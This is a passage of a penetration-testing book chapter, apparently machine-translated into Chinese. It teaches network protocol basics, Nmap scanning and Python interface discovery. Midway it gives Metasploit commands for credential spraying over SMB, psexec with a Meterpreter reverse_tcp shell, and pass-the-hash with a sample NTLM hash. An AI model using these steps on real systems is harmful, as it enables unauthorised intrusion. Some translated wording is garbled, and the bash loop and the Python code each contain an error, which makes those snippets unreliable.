# 第 3 章：使用 Nmap、Scapy 和 Python 识别目标

目标识别、网络监视和主动侦察都是您可以看到的相互替代的术语，用于描述评估环境的初始过程。根据您使用的框架，例如 PTE、自定义公司方法或其他行业标准，这些术语的含义可能不同。需要记住的重要一点是，您正在查看哪些主机处于批准的范围内，以及它们具有哪些开放和响应的服务、端口和功能。

这些方面将决定您将从此处执行哪些活动。通常，这一阶段是短暂的，评估人员会直接利用他们看到的对扫描有反应的系统。新的评估员不是有条不紊地研究可能的目标，而是全力以赴。这可能在之前的项目中对他们很有帮助，他们很快就达到了目标，但以这种方式进行评估的其他影响很多评估人员都没有意识到。

他们甚至可能错过更容易利用的低垂果实系统。因此，如果作为评估员，您没有看到这一点，而恶意行为人可能看到了这一点，那么几个月后，您可能会与客户进行一次不愉快的对话，讨论您为何错过了此漏洞。但是，请记住，渗透测试是时间的快照，环境总是在变化。环境中的控制和限制被调整，系统经常被重新分配。因此，在新的评估中可能会出现旧的漏洞。有条不紊意味着你可以找到不止一个悬而未决的目标，这可以帮助你与客户建立融洽的关系，从而获得更多的工作。最重要的是，它将指出客户的缺陷的根本原因，如果这些缺陷没有得到修复，这些缺陷将继续导致控制失效。

可以说，你从一个跳过枪的人身上看到的评估员的最大影响是，他们可能开始利用在组织中没有重要用途的系统。这意味着，尽管他们破解了一个盒子，但它没有提供任何通过网络移动的价值，或者该漏洞不可利用，因此，它可能被视为误报。因此，所有这些最初的扫描都必须重新开始，这浪费了宝贵的时间，增加了无法实现交战目标的可能性。要了解如何扫描网络，您必须首先了解网络帧、数据包、消息和数据报，以便可以对它们进行操作。

# 了解系统如何通信

有整整一系列的书专门讲述网络如何沟通；本章将从一些非常基本的信息开始。如果您已经理解了这些数据，我建议您作为复习阅读，以防涉及到一些新的或不同的细节。此外，还参考了一些标题组件和有效负载的大小。这些是关于如何引用网络协议的细节，以及协议如何根据传输的数据和/或专业网络中的差异而有所不同。

当系统生成数据时，通过系统的**传输控制协议**（**TCP**）/**互联网协议**（**IP**栈）向下发送。这将数据打包成可以通过电线传输的东西。如果您听说过**开放系统互连**（**OSI**）模型，那么您知道这就是人们讨论系统如何处理数据的方式，而 TCP/IP 模型是系统实际操作的方式。

### 注

每个系统都有一个 TCP/IP 堆栈，它代表 TCP/IP 模型的实现。理解套接字是执行通信的工具是很重要的。这是通过链接源和目标 IP 地址以及源和目标端口来实现的。

有一个称为**临时端口范围**的端口范围。它的范围因系统而异。这些端口也称为动态端口，客户端将其用作通过套接字进行通信的源端口。它们也可以是服务器上已知服务的目标端口，前提是已知端口是针对目标而设计的通信代理。诸如**文件传输协议**（**FTP**等服务使用此技术。您必须知道这一点的原因是，在尝试和识别目标时，通常不需要扫描这些临时端口，因为它们很少是服务启动器。因此，它们是短暂的，并且仅与特定通信流相关联。

### 提示

请记住，管理员通常会在这些较高的端口范围中隐藏已知服务，以尝试创建无法识别服务的情况。这被称为**模糊安全**。在扫描多台主机时，您可能需要避免扫描这些范围，因为这样做需要花费更多的时间。如果尚未识别许多服务，或者目标网络中有一些主机，则可能需要将这些主机包括在扫描范围内。

第四层报头表示 TCP 和**用户数据报协议**（**UDP**报头以及特定 IP 的端口目标连接。第三层头表示 IP 和**互联网控制消息协议**（**ICMP**）头。第二层报头与帧报头、拖车和**地址解析协议**（**ARP**相关。下图描述了两个系统之间通信的帧生成方法：

![Understanding how systems communicate](../Images/image00283.jpeg)

既然您已经了解了框架是如何自上而下生成的，那么让我们向上移动堆栈，看看如何解构每个组件以获取数据。从这里开始，您将从以太网帧开始。

## 以太网帧结构

帧是中数据从主机到主机的传输方式，帧由多个组件组成。您可以在 wiki 和工程文档中阅读大量与框架相关的信息，但有几件事您需要了解。帧通过称为**媒体访问控制**（**MAC**）地址的硬件地址进行通信。无线网络和以太网的帧略有不同。此外，在帧的末尾是校验和。这是一种基本的数学检查，用于在数据通过导线传输后验证数据的完整性。以下是以 TCP 端口为最终目标的以太网帧的屏幕截图：

![The Ethernet frame architecture](../Images/image00284.jpeg)

下一个屏幕截图表示以 UDP 端口为结束目标的帧的内容：

![The Ethernet frame architecture](../Images/image00285.jpeg)

### 以太网中的第二层

帧用于在默认网关内的广播域或位置内进行通信，或在通过路由器之前进行通信。一旦路由器通过，其路由器硬件地址的接口将用于下一个广播域。这些也通常根据设备之间的通信协议以帧的形式发送。这会一次又一次地进行，直到帧到达由 IP 地址划定的目的地。了解这一点非常重要，因为如果您希望使用 Responder 或 eTerCap 等工具运行大多数**中间人**（**MitM**）攻击，您必须在广播域内，因为它们是第 2 层攻击。

### 无线网络中的第二层

无线攻击的概念非常相似，因为您必须在**服务集标识符**（**SSID**或实际无线网络名称的范围内。根据无线网络的设计，您的通信列车略有不同，但您使用的**接入点**（AP）由**基本服务集标识符**（**BSSID**）区分，这是 AP MAC 地址的一个别致名称。

一旦您通过 AP 关联并认证到网络中，您就是**基本服务集**（**BSS**或企业网络组件的一部分，但仅限于 AP 的范围。

如果您进入无线网络并与新 AP 关联，因为信号更好，您将成为新 BSS 的一部分。所有 BSS 都是**企业服务集****ESS**的一部分；有趣的是，如果无线网络包含多个 AP，那么它就是 ESS。为了能够与无线工程师沟通，您必须了解，如果您在企业无线网络中，SSID 实际上被称为**企业 SSID**（**ESSID**）。现在，您已经了解了第 2 层头，是时候看看 IP 头了。

### 注

根据您正在阅读的网络文档，如果存在**配电系统**（**DS**）和一个 AP，或者两个 AP 和一个 DS，则会创建 ESS。DS 只是连接 AP 的非无线网络的一个别致的名称。记住这一点很重要，因为根据公司使用的产品品牌，行话可能略有不同。

## IP 分组架构

IP 报头包含通过使用 IP 地址的网络进行通信所需的数据。这允许通信流超出广播域。下图显示了 IPv4 标头的示例标头：

![The IP packet architecture](../Images/image00286.jpeg)

你可能已经读到了 IPv4 即将结束，或者说它即将结束。嗯，正如你可能听说的那样，替代品是 IPv6。这个新的地址方案提供了大量新的主机地址，但正如您在两种头类型的比较中所看到的，字段要少得多。需要知道的一件事是，与 IPv4 相比，IPv6 存在大量与之相关的漏洞。

这有很多原因，但最重要的原因是，当组织将安全概念应用于其网络时，他们忘记了默认情况下支持 IPv6 并启用了 IPv6。这意味着，当他们配置保护机制时，他们通常使用 IPv4 地址。如果启用了 IPv6，且安全设备不知道网络中的不同地址类型或与这些设备的关联，则攻击可能会被忽略。

这样想吧：假设你有一所房子，有前门和后门，只有前门有保安。这所房子的实际地址是一样的，但是你进去的方式完全不同，因为它有两扇不同的门。这个安全概念是非常相似的，因此，组织应该记住，IPv6 可以打开一个组织的新漏洞，如果它不仔细考虑影响。下图显示了 IPv6 数据包结构的示例：

![The IP packet architecture](../Images/image00287.jpeg)

## TCP 报头架构

相对而言，TCP 数据包头比 UDP 数据包头大得多。它必须适应必要的顺序、标志和控制机制。具体地说，数据包用于使用许多不同的标志处理会话设置和拆卸。攻击者可以通过操纵这些标志从目标系统获取响应。

下图显示了 TCP 标头：

![The TCP header architecture](../Images/image00288.jpeg)

## 了解 TCP 的工作原理

在您了解如何执行扫描和识别主机之前，您需要了解 TCP 通信流是如何工作的。TCP 是一种面向连接的协议，这意味着在两个系统之间建立会话。一旦发生这种情况，就可以发送最初用于通信的信息，并且当所有数据都已发送时，连接将关闭。

### TCP 三方握手

TCP 握手也称为三向握手。这意味着在建立通信套接字之前，在两个系统之间来回发送三条消息。这三条消息是 SYN、SYN-ACK 和 ACK。试图启动连接的系统从设置了`SYN`标志的数据包开始。应答系统返回设置了`SYN`和`ACK`标志的数据包。最后，发起系统将设置有`ACK`标志的数据包返回给原始目标系统。在较旧的系统中，如果通信列车未完成，可能会出现意外后果。如今，大多数系统都足够智能，只需**重置**（**RST**）连接或优雅地关闭连接即可。

## UDP 报头架构

TCP 是一种面向连接的协议，而 UDP 是一种简单的面向无连接的协议。如下图所示，UDP 数据包的报头要简单得多。这是因为与 TCP 相比，UDP 维护套接字的开销要少得多。

![The UDP header architecture](../Images/image00289.jpeg)

## 了解 UDP 的工作原理

UDP 与监听端口建立通信流。该端口接受数据，并根据需要在 TCP/IP 堆栈上运行它。虽然同步和可靠的通信需要 TCP，但 UDP 不是。多媒体演示是 UDP 通信的最佳示例。如果你正在看一部电影，你不会在意一个可能丢失的包，因为即使它是重新出现的，在电影从最初的打嗝开始放映之后再放映也没有意义。既然您已经了解了系统通信的基础知识，那么您需要了解如何使用不同的标志来使用 Nmap 扫描技术收集所需的数据。

### 注

每一次扫描都有不同的目的，特定的标志会从操作系统中引发不同的响应，这取决于它们是否按顺序接收。nmap 端口扫描技术网页[http://nmap.org/book/man-port-scanning-techniques.html](http://nmap.org/book/man-port-scanning-techniques.html) 简洁地详述了该信息。

# 理解 Nmap

如果有一个工具在大多数顶级和新的评估工具包中无处不在，那就是 nmap。您可能会发现不同的利用框架、web 应用程序工具和其他首选项，但 nmap 是许多评估形式的主要工具。现在，这并不是说没有其他工具可以使用类似的功能执行；只是他们没有那么能干。这包括 Angyip、HPing、FPing、NetScan、Unicorn scan 等工具。从所有这些工具中，只有两个明显不同，它们是 HPing 和 Unicorn scan。

我看到新评估员在使用 nmap 时犯的最大错误是一次从同一主机执行多个扫描。他们没有意识到的是，nmap 使用主机操作系统的集成 TCP/IP 堆栈。这意味着执行的任何附加扫描都不会加快结果的速度；相反，操作系统 TCP/IP 堆栈必须同时处理多个会话。这反过来不仅会减慢每次扫描的结果，还会增加错误，因为每个接收到的数据包都会影响结果，具体取决于它接收到的实例。

每个丢失的数据包可能会重新发送；这意味着扫描速度会减慢，这不仅是因为重新发送的数据包的数量，还因为不一致的结果和受限的 TCP/IP 堆栈。这意味着每个主机只能执行一个 nmap 扫描实例。因此，您必须尽可能高效。那么解决方案是什么呢？可以使用 nmap 使用主机 TCP/IP 堆栈和 Unicorn 扫描执行扫描，Unicorn 扫描包含自己的 TCP/IP 堆栈。事实是，通过有效地使用 nmap 而不是同时使用多个工具，可以避免整个情况，因为这会占用相对的时钟周期。

因此，除了处理驻留 TCP/IP 堆栈的限制外，还存在通过 nmap 操作详细数据包的限制。HPing 提供了相对容易地创建满足特定目的的自定义数据包的能力。尽管有这种定制，HPing 仅在以定制方式针对单个主机执行测试时有效。如果多台主机需要相对定制的简单 ping，那么 FPing 应该是首选工具。这尤其是因为 FPing 在**标准输出**（**标准输出**中产生的结果易于分析，以产生高效和有用的结果。这并不是说 nmap 不是一个高度可配置的工具，而是要指出，它不是一个有经验和智能的评估员的替代品，每个工具都有它的位置。因此，您需要了解其局限性，并根据需要进行补充。

## 输入 Nmap 的目标范围

Nmap 可以通过**标准输入**（**标准输入**）或通过文件直接从**命令行界面**（**CLI**传递数据时，输入目标。对于 CLI，这可以通过多种方式实现，包括一系列 IP 地址，以及 IP 地址的**无类域间路由**（**CIDR**）符号。对于文件，IP 地址可以通过上述方法传递，包括 CIDR 表示法、IP 地址和范围，也可以通过由换行符或回车分隔的 IP 列表传递。要通过 CLI 传递数据，用户所要做的就是在命令末尾显示该片段，如下所示：

```
nmap -sS -vvv -p 80 192.168.195.0/24

```

对于文件输入法，所需的只是`-iL`选项，后跟文件名：

```
nmap -sS -vvv -p 80 -iL nmap_subnet_file

```

## 执行不同的扫描类型

Nmap 有大量的支持的不同扫描，但这里并不是全部。相反，我们将重点关注您在评估中使用最多的扫描。您主要使用的四种扫描是 TCP 连接扫描（也称为完全连接扫描）、SYN 扫描（也称为半开放或隐藏扫描）、ACK 扫描和 UDP 扫描。这些都是为将来的脚本编写工作而突出显示的级别集知识。

### 注

执行外部测试时，您可能会被自动阻止或回避。这可以由客户的**互联网服务提供商****ISP**或其**信息技术****IT**团队执行。您应该始终拥有备份公共 IP 地址，以防主 IP 地址被阻止。然后，避免做之前阻碍你的事情。下一步，当你看到客户做一个积极的块文件，因为这种积极的活动突出了他们应该考虑在哪里继续他们的投资和他们有差距。

### 执行 TCP 全连接扫描

TCP 连接扫描是 nmap 最响亮或最容易检测的扫描之一，但它也是消除误报的最佳扫描之一。早些时候，**事件响应（IR）**和安全团队非常关注是什么在扫描周界，以便确定何时会受到攻击。随着周界产生的噪音变得过多，时代发生了变化，以前看到的大部分访问都通过更先进的防火墙得到了缓解。如今，IR 团队再次关注周边环境，并利用他们看到的活动关联事件和未来进入网络的潜在尝试，或跟进与已执行攻击相关的后续行动。

TCP 连接扫描可能提供最准确的结果，但自动回避机制通常会在**互联网服务提供商**（**ISP**处阻断扫描源。要执行 TCP 扫描，您所要做的就是用`-sT`指示相关的扫描类型，如所示：

```
nmap -sT -vvv -p 80 192.168.195.0/24

```

### 注

我评估过许多组织，它们只能通过完全连接扫描进行扫描，因为如果执行 SYN 扫描，它们会立即避开连接。诀窍是了解您的目标以及他们的环境有多先进。其中大部分可在交战前阶段确定。

### 执行 SYN 扫描

SYN 扫描是一种 TCP 扫描，它们是您在约会期间可能运行的最显著的扫描。原因是它们比 TCP 连接扫描快得多，而且安静得多。但是，它们不适用于设备类型非常陈旧或敏感的环境。虽然大多数现代系统在没有及时收到 ACK 响应的情况下关闭连接不会有问题，但其他系统可能会有问题。过去曾多次出现过这样的情况：如果连接未完成，某些遗留系统可能会出现**拒绝服务**（**拒绝服务**情况。如今，这些产品非常稀少，但总是考虑客户的关注，因为他们比你更了解自己的环境。

SYN 扫描仅使用`-sS`标志执行，如下所示：

```
nmap -sS -vvv -p 80 192.168.195.0/24

```

### 执行确认扫描

ACK 扫描是三种 TCP 扫描类型中最罕见的，而且可能没有您想象的那么直接有用。让我们看看什么时候使用 ACK 扫描。这是一个缓慢的扫描，因此如果 SYN 或 TCP 扫描不能提供所需的结果，您将使用它。Nmap 今天相当智能；您通常不需要执行不同类型的扫描来验证所击中目标的类型。因此，您将尝试识别一个完全连接扫描无法使用的资源。这意味着您可能无法连接到主机进行进一步的攻击，因为您无法完成三方握手。

那么 ACK 扫描在哪里有用呢？人们经常问这个问题，答案是“防火墙”。ACK 扫描非常适合映射防火墙规则集。一些系统对 ACK 扫描的反应非常奇怪，并提供额外的数据作为回报，因此在执行 ACK 扫描时，请确保您的`tcpdump`在内联点击或系统上运行。以下是如何执行确认扫描的示例。按如下方式运行命令：

```
nmap -sA -vvv -p80 192.168.195.0/24

```

### 执行 UDP 扫描

你会看到大量的博客文章和书籍，还会遇到一些培训活动，这些活动突出了 UDP 是一个经常被忽视的协议这一事实。在以后的章节中，我们将强调这对一个组织来说是多么危险。UDP 扫描速度非常慢，而且由于 UDP 的端口数与 TCP 的端口数一样多，因此扫描这些端口将花费大量时间。此外，UDP 扫描缺少更好的术语谎言。他们通常会将事情报告为过滤/打开，这基本上意味着它不知道。

在非常大的环境中，这可能会令人恼火。它还不具备获取大部分 UDP 端口服务信息的全部功能。最常见的端口都有专门打包的扫描数据，这允许 nmap 确定端口是否真正打开以及存在什么服务，因为服务并不总是在默认端口上。当服务移动到 UDP 端口时，会对 nmap 返回的默认扫描数据产生影响，与 TCP 扫描相反，TCP 扫描的影响不大。

要执行 UDP 扫描，只需将扫描标志设置为`-sU`，如下所示：

```
nmap -sU -vvv -p161 192.168.195.0/24

```

## 执行 UDP 和 TCP 组合扫描

现在，您知道了如何运行主扫描，但是逐个运行 TCP 和 UDP 扫描可能需要很长时间。为了节省时间，您可以通过为两种类型的扫描指定端口来组合资源扫描。然而，要聪明一点；如果您在此扫描中使用了大量端口，则将永远无法完成。因此，此扫描非常适合定位顶级端口，您可以使用这些端口识别最有可能被破坏的易受攻击资源，例如：

<colgroup><col> <col> <col> <col></colgroup> 
| 

服务类型

 | 

通用端口号

 | 

协议

 | 

服务

 |
| --- | --- | --- | --- |
| 数据库 | `1433` | 传输控制协议 | Microsoft 结构化查询语言（MSSQL）服务器 |
| `1434` | UDP | SQL Server 浏览器服务 |
| `3306` | 传输控制协议 | MySQL |
| `5433` | 传输控制协议 | PostgresSQL 服务器 |
| 远程文件服务 | `2049` | 传输控制协议 | 网络文件服务（NFS） |
| `111` | 传输控制协议 | Sun 远程过程调用（RPP） |
| `445` | 传输控制协议 | 服务器消息块（SMB） |
| `21` | 传输控制协议 | 文件传输协议（FTP） |
| 远程管理接口 | `3389` | 传输控制协议 | 远程桌面协议（RDP） |
| `22` | 传输控制协议 | 安全 Shell（SSH） |
| `23` | 传输控制协议 | 电信网 |
| `6000 to 6005` | 传输控制协议 | x11 |
| `5900` | 传输控制协议 | 虚拟网络连接器（VNC） |
| `9999` | 传输控制协议 | 传统网络设备的已知远程管理接口 |
| 接口和系统/用户枚举服务 | `25` | 传输控制协议 | 发送邮件传输协议（SMTP） |
| `79` | 传输控制协议 | 手指 |
| `161` | UDP | 简单网络管理协议 |
| 网络服务器 | `80, 443` | 传输控制协议 | 网络服务 |
| `8080, 8443, and 8888` | 传输控制协议 | Tomcat 管理页面、JBoss 管理页面、系统管理面板 |
| **虚拟专用网**（**VPN**管理详情 | `500` | UDP | Internet 安全关联和密钥管理协议（ISAKMP） |

要执行组合扫描，只需标记要使用的两种扫描类型，并逐项列出每个协议要扫描的端口。这是通过提供`-p`选项来完成的，然后是用于 UPD 端口的`U:`和用于 TCP 端口的`T:`。请参见以下示例，为了简洁起见，该示例仅突出显示了几个端口：

```
nmap -sS -sU -vvv -p U:161,139 T:8080,21 192.168.195.0/24

```

## 跳过操作系统扫描

我看到许多新的评估员兴高采烈地在操作系统上搜索 nmap。这是我的团队成员知道的识别不定期评估企业环境的人的最快方法之一。原因如下：

*   操作系统扫描非常嘈杂
*   它可以关闭遗留系统，因为它执行链式扫描以确定响应并验证系统类型
*   对于旧的或遗留的系统，它可能具有破坏性
*   在过去，某些打印机会出现问题，包括墨水浸透的黑色页面，直到它们被关闭或用完纸张

经验丰富的评估人员不使用此扫描的最大原因是，它在今天几乎没有什么价值。您可以使用其他方法更快、更容易、更安静地识别此扫描提供的详细信息。例如，如果您看到端口`445`打开，则它可能是运行 Samba 变体的系统，也可能是 Windows 主机。与此扫描相比，了解每个操作系统的端口、服务标签和版本将更好地识别操作系统和版本。此外，如果您无法通过此方法识别系统，nmap 也不太可能做到这一点，当然这取决于您的技能水平。

### 提示

随着经验的积累，您将学习如何使用诸如 Responder、tcpdump 和 Wireshark 之类的工具被动地识别活动主机。这意味着您不需要扫描主机，实际上，您正在变得更安静。这也是对真实恶意参与者的更好模拟。

## 不同的输出类型

Nmap 有四种输出类型，根据具体情况，它们非常有用。它们与屏幕、`STDOUT`或三种不同的文件类型相关。这些文件类型有不同的用途和优点。有 nmap 输出，看起来与`STDOUT`相同，但只是在一个文件中；这是通过`-oN`完成的。然后，有`Grepable`和可扩展标记语言（XML）输出，如下所述。使用`-oA`标志可同时产生所有输出。

### 了解 Nmap 可分级输出

还有可灰显的输出，说实话，这对于灰显数据来说并不是那么好。它可以提供一种简单的方法来提取数据的组成部分，以快速、轻松地构建列表，但要正确地用`grep`、`sed`和`awk`解析它，实际上必须插入字符来表示应该提取数据的位置。可以通过标记`-oG`标志来执行可分级输出。

在您拥有一个可归格的文件之后，解析数据的最有用的方法是键入该文件的某些组件。您通常在寻找与特定服务相关的开放端口。因此，您可以通过执行以下命令来提取这些详细信息：

```
cat nmap_scan.gnmap | grep 445/open/tcp | cut -d" " -f2 >> /root/Desktop/smb_hosts_list

```

该示例显示一个可归格文件被推送到`STDOUT`，然后通过管道传输到`grep`，后者搜索打开的`445 ports`。这只能通过`grep`和剪切来完成，但它非常容易阅读和理解。一旦找到端口，cut 将提取 IP 地址并将其推送到一个称为`smb_hosts_lists`的平面文件中。如果查看`nmap_scan.gnmap`文件，可能会看到包含以下详细信息的行：

```
Host: 192.168.195.112 () Ports: 445/open/tcp/

```

如您所见，该行包含`445/open/tcp`详细信息，这允许我们针对该特定行。然后，我们使用空格作为定界键进行剪切，并选择字段 2，其中，如果按空格计算数据字段，则可以找到 IP 地址。此技术非常常见，可用于快速识别 IP 地址打开的内容，并基于服务或端口创建多个平面文件。

如[第 1 章](01.html#aid-F8901 "Chapter 1. Understanding the Penetration Testing Methodology")所示，*了解渗透测试方法*后，您可以使用 Metasploit 模块中的`rhosts`字段，通过 CIDR 符号或范围来定位主机。创建平面文件时，可以使用 Metasploit 模块通过引用平面文件来访问主机列表。要运行 Metasploit 控制台，请执行以下命令：

```
msfconsole

```

如果从命令行运行 Metasploit Professional，请使用以下命令：

```
msfpro

```

现在来看这个例子，其中我们将尝试查看我们之前破解的密码是否在网络其余部分的任何主机上工作：

```
use auxiliary/scanner/smb/smb_login
set SMBUser administrator
set SMBPass test
set SMBDomain Workgroup
set RHOSTS file:/root/Desktop/smb_hosts_list
run

```

`use`命令选择本例中要使用`smb_login`模块的模块，该模块验证**服务器消息块**（**SMB**）凭证。`SMBUser`集合选择您要对其执行此攻击的用户名。`SMBPass`集合选择本模块中要使用的密码。设置`SMBDomain`字段允许您为组织设置域。`run`命令执行辅助模块。在早些年，您必须使用`run`来执行一个辅助模块，并对一个利用模块进行利用。如今，这些模块确实是可互换的，是开发后模块的例外，需要`run`，如[所示 https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/](https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/) 。

### 提示

如果您使用本地帐户进行攻击，则应将域设置为工作组。攻击域帐户时，应将域设置为组织的实际域。

Metasploit Professional 是一个帮助优化渗透测试工作的工具，它有一个 web**图形用户界面**（GUI）。Metasploit pro 提供了许多出色的功能，但是如果您需要在受防火墙保护的多个网络层之间切换，控制台是最佳选择。要了解如何执行自动旋转，您可以在[找到详细信息 https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/) 。要了解如何执行手动枢轴，请参阅[https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot](https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot) ，包括基于端口的旋转、手动路由和 SOCKS 代理。

这种攻击方式非常普遍；您可以查找凭据，确定凭据可能使用的服务，然后为目标主机构建平面文件。接下来，您将引用这些平面文件来检查主机是否存在漏洞。一旦您确认这些主机易受攻击，您可以使用**进程执行****PSEXEC**攻击（如果您有哈希）或标准认证的 PSEXEC，通过**传递哈希****PtH**攻击利用它们，如下代码所示：

### 提示

PtH 是一种攻击，它利用了与系统如何在网络上进行身份验证相关的本机 Windows 弱点。不需要质询/响应身份验证方法，哈希密码可以直接传递给主机。这意味着您不必破解**局域网管理器****LM**或**新技术 LM****NTLM**哈希。许多 Metasploit 模块可以对 SMB 服务使用凭据或哈希。

```
msfconsole
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass test
set SMBDomain Workgroup
set payload windows/meterpreter/reverse_tcp
set RHOST 192.168.195.112
set LPORT 443
exploit -j

```

set`payload`命令选择要在主机上丢弃的有效负载，然后执行。`reverse_tcp`有效载荷拨回攻击箱以建立连接。如果它是一个`bind`有效载荷，那么在执行后，攻击盒将直接连接到侦听端口。`RHOST`和`LPORT`表示我们要连接的目标主机，以及我们要监听的用于返回通信的攻击盒上的端口。`exploit -j`运行漏洞攻击，然后对结果进行后台处理，这允许您专注于其他事情，根据需要使用`session -i <session number>`返回会话。请记住，执行`smb_login`或`psexec`不需要破解的凭据；相反，您可以只使用 PtH。在这种情况下，`smb_login`命令的文本看起来像以下代码：

### 注

当流程执行完成时，将删除掉在框上的所有有效负载。如果执行过程中断，有效负载可能会留在系统上。如果未正确配置工具以删除检测到的进程的生成器，则使用监视进程的工具的安全性更好的环境可能会有这样的实例。

```
msfconsole
use auxiliary/scanner/smb/smb_login
set SMBUser administrator
set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537
set SMBDomain Workgroup
set RHOSTS file:/root/Desktop/smb_hosts_list
run

```

以下配置将用于`psexec`命令：

```
msfconsole
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537
set SMBDomain Workgroup
set payload windows/meterpreter/reverse_tcp
set RHOST 192.168.195.112
set LPORT 443
exploit -j

```

现在您已经了解了`nmap grepable`输出的目的和好处，让我们看看 XML 输出的好处。在继续之前，应该注意一项，这将帮助您了解 XML 的好处是什么。查看`nmap grepable`输出的线路。您可以看到，用于区分数据字段的特殊字符很少；这意味着您可以轻松地只提取信息的一小部分。要获得更大的数量，必须使用`sed`和`awk`插入轮廓线。这是一个痛苦的过程，但谢天谢地，您手头有 XML 输出的解决方案。

### 理解 Nmap XML 输出

XML 构建使用子组件和父组件标记数据集的数据树。这允许在遍历列出父关系和子关系的树后，使用特定的标签抓取轻松直接地解析数据。最重要的是，正因为如此，XML 输出可以由其他工具（如 Metasploit）导入。您可以使用`-oX`选项轻松地仅输出为 XML。这些好处的更多细节将在后面的章节中介绍，特别是在[第 9 章](09.html#aid-29DRA2 "Chapter 9. Automating Reports and Tasks with Python")中使用 Python 解析 XML 时，*使用 Python*自动生成报告和任务，以帮助自动生成报告数据。

## Nmap 脚本引擎

Nmap 有许多为评估员提供独特功能的脚本。它们可以帮助识别易受攻击的服务，利用系统或与复杂系统组件交互。这些脚本是用一种称为 Lua 的语言编写的，这里将不介绍这种语言。这些脚本可以在 Kali 的`/usr/share/nmap/scripts`中找到。每个脚本都可以使用`--script`选项调用，然后在逗号分隔列表中调用。在对目标系统执行脚本之前，请确保您知道每个脚本的作用，因为可能会对目标系统造成意外后果。

### 注

有关`nmap`脚本的更多详细信息，请访问[http://nmap.org/book/man-nse.html](http://nmap.org/book/man-nse.html) 。有关`nmap`脚本的详细信息，请参见[http://nmap.org/nsedoc/](http://nmap.org/nsedoc/) 及其目的和类别关联。

脚本可以由它们所属的类别调用，也可以从您不希望它们成为其中一部分的类别中删除。例如，您可以看到以下命令使用所有默认或安全脚本（不以`http-`开头）运行`nmap`工具：

```
nmap --script "(default or safe) and not http-*" <target IP>

```

到目前为止，您应该已经非常了解如何使用 nmap 及其功能。让我们看看如何使用 nmap 提高效率。这是因为渗透测试的最大限制因素是时间，在这段时间内，我们需要简洁地识别易受攻击的目标。

## Nmap 扫描有效

Nmap 是一个很好的工具，但您可能会受到不良网络设计、大目标集和不受限制的端口范围的限制。因此，提高效率的诀窍是限制扫描端口的数量，直到知道哪些目标处于活动状态。这可以通过针对具有活动设备的子网并仅扫描这些范围来实现。最简单的方法是查找网络中处于活动状态的默认网关。因此，如果您看到您的默认网关是`192.168.1.1`，则在该 C 类网络中，其他默认网关可能在`192.168.2.1`等区域处于活动状态。ping 默认网关是一个有点嘈杂的过程，但它通常与大多数标称网络流量一致。

Nmap 有一个内置功能，允许您使用`--top-ports`选项定位统计上更常见的端口，然后使用数字进行跟踪。例如，您可以使用`--top-ports 10`选项查找前 10 个端口。这些统计数据是通过对面向互联网的主机进行长期扫描发现的，这意味着这些统计数据是基于可能暴露在互联网上的内容。因此，请记住，如果您正在进行内部网络评估，此选项可能无法提供预期的结果。

作为一名评估员，您通常会被提供一系列评估目标。有时，这个范围非常大。这意味着您需要尝试通过查看哪些位置的默认网关处于活动状态来识别活动段。每个活动的默认网关和相关子网将告诉您应该扫描的位置。因此，如果您有一个默认网关`192.168.1.1`，并且您的子网是`255.255.255.0`或`/24`，那么您应该检查从`192.168.2.1`到`192.168.255.1`的其他默认网关。当您 ping 每个默认网关时，如果它响应，您就知道该子网中可能有活动主机。这可以通过著名的 bash`for`循环轻松完成：

```
for i in `seq 1 255`; do ping -c 1 192.168.$1.1 | tr \\n ' ' | awk '/1 received/ {print $2}'; done

```

这意味着您必须查找默认网关地址和子网，以验证所使用的每个接口的详细信息。如果您可以使用 Python 脚本自动查找这些系统详细信息，该怎么办？要开始这段旅程，首先提取`netifaces`库接口的细节。

### 确定您与 netifaces 库的接口详细信息

我们在[第 2 章](02.html#aid-KVCC1 "Chapter 2. The Basics of Python Scripting")*Python 脚本基础*中演示了如何使用 Python 脚本查找接口细节。它被设计用来查找任何系统的详细信息，而不考虑库，但它只根据提供的接口名称列表查找地址。此外，这是一个脚本，不会被认为是非常紧张。相反，我们可以使用 Python 的`netifaces`库来迭代地址并发现细节。

此脚本使用许多函数来完成特定任务。包括的功能有`get_networks`、`get_addresses`、`get_gateways`和`get_interfaces`。这些函数正是您所期望的。第一个函数`get_interfaces`查找该系统的所有相关接口：

```
def get_interfaces():
    interfaces = netifaces.interfaces()
    return interfaces
```

第二个函数标识网关并将其作为字典返回：

```
def get_gateways():
    gateway_dict = {}
    gws = netifaces.gateways()
    for gw in gws:
        try:
            gateway_iface = gws[gw][netifaces.AF_INET]
            gateway_ip, iface = gateway_iface[0], gateway_iface[1]
            gw_list =[gateway_ip, iface]
            gateway_dict[gw]=gw_list
        except:
            pass
    return gateway_dict
```

第三个功能标识每个接口的地址，包括 MAC 地址、接口地址（通常为 IPv4）、广播地址和网络掩码。所有这些详细信息都是通过传递接口名称的函数获得的：

```
def get_addresses(interface):
    addrs = netifaces.ifaddresses(interface)
    link_addr = addrs[netifaces.AF_LINK]
    iface_addrs = addrs[netifaces.AF_INET]
    iface_dict = iface_addrs[0]
    link_dict = link_addr[0]
    hwaddr = link_dict.get('addr')
    iface_addr = iface_dict.get('addr')
    iface_broadcast = iface_dict.get('broadcast')
    iface_netmask = iface_dict.get('netmask')
    return hwaddr, iface_addr, iface_broadcast, iface_netmask
```

第四个也是最后一个功能从`get_gateways`功能提供给接口的字典中识别网关 IP。然后它调用`get_addresses`函数来识别接口的其余细节。所有这些都将加载到由接口名称键入的字典中：

```
def get_networks(gateways_dict):
    networks_dict = {}
    for key, value in gateways.iteritems():
        gateway_ip, iface = value[0], value[1]
        hwaddress, addr, broadcast, netmask  = get_addresses(iface)
        network = {'gateway': gateway_ip, 'hwaddr' : hwaddress, 
          'addr' : addr, 'broadcast' : broadcast, 'netmask' : netmask}
        networks_dict[iface] = network
    return networks_dict
```

### 注

